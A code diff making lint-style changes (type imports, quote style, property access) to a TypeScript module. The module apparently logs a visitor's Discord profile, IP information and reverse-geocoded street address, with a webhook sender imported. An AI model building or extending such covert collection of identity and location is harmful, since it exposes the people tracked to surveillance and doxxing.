@@ -1,7 +1,7 @@
-import { DiscordUser } from "@/lib/types";
 import { sendWebhook } from "@/lib/functions/webhook";
-import { UserLocation } from "@/lib/hooks/user-location-hooks";
-import { ScreenSize } from "@/lib/hooks/screen-size-hooks";
+import type { ScreenSize } from "@/lib/hooks/screen-size-hooks";
+import type { UserLocation } from "@/lib/hooks/user-location-hooks";
+import type { DiscordUser } from "@/lib/types";
 
 export async function logger(
   userInfo: DiscordUser,
@@ -54,7 +54,7 @@ async function getIpInfo(ip: string): Promise<IpInfo> {
 
 export async function getUserInfo(accessToken: string): Promise<DiscordUser> {
   try {
-    const res = await fetch(`https://discord.com/api/users/@me`, {
+    const res = await fetch("https://discord.com/api/users/@me", {
       method: "GET",
       headers: {
         Authorization: `Bearer ${accessToken}`,
@@ -80,7 +80,7 @@ async function getAddress(latitude: number, longitude: number): Promise<string> 
       return "N/A";
     }
     const data = await response.json();
-    return data["results"][0]["formatted"];
+    return data.results[0].formatted;
   } catch {
     return "N/A";
   }
